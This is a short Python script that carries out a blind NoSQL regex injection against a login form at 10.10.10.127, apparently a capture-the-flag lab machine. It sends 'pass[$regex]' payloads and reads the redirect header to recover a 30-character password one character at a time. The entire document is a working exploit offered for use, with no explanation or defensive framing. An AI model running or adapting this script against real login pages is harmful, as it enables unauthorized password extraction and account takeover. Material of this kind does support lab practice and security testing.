import requests
import string

# Target URL
url = "http://10.10.10.127"

# Character set to test (digits, uppercase, lowercase)
charset = string.digits + string.ascii_letters

# Initialize variables
password = ""
password_length = 30  # Given length of the password

print("Starting password extraction...\n")

for i in range(1, password_length + 1):
    found = False
    for char in charset:
        # Construct the regex payload
        payload = {"pass[$regex]": f"^{password}{char}.*$"}
        print(f"Testing payload: {payload}")

        # Send the request
        response = requests.post(url, data=payload)

        # Debug response details
        print(f"Response status: {response.status_code}")
        print(f"Response headers: {response.headers}")
        print(f"Response body: {response.text[:300]}")  # Print the first 300 characters of the body

        # Updated logic: Look for distinguishing features
        if "/?err=1&pass=" not in response.headers.get("Location", ""):
            # Correct guess: Update the password
            password += char
            print(f"Character found: {char} -> Current password: {password}\n")
            found = True
            break

    if not found:
        print("Failed to find the next character. Exiting.\n")
        break

print(f"Extracted password: {password}")
